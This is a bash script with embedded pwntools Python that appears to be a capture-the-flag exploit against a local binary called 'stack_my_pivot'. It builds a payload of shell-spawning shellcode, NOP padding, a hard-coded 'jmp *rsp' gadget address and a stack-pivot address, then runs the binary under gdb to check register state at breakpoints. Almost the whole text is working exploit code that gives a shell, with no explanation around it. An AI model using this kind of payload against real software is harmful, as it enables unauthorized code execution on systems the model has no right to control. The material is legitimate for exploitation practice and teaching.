#!/bin/bash

python3 << 'EOF'
from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
first_input = shellcode.ljust(50, b'\x90')

second_input = b'\x90' * 8
second_input += p64(0x400738)  # jmp *rsp  
second_input += b'AAAAAAAA'  # placeholder
second_input = second_input[:23].ljust(23, b'\x90')
second_input += p32(0x40072e)
second_input += b'\x90'

with open('/tmp/gdb_input', 'wb') as f:
    f.write(first_input + second_input)
EOF

gdb -batch \
  -ex 'break *0x40072e' \
  -ex 'break *0x400738' \
  -ex 'run < /tmp/gdb_input' \
  -ex 'info registers rsi rbp rsp' \
  -ex 'x/10gx $rsi-0x50' \
  -ex 'continue' \
  -ex 'info registers rsp rsi' \
  -ex 'x/4gx $rsp' \
  ./stack_my_pivot 2>&1 | grep -A 20 "Breakpoint"
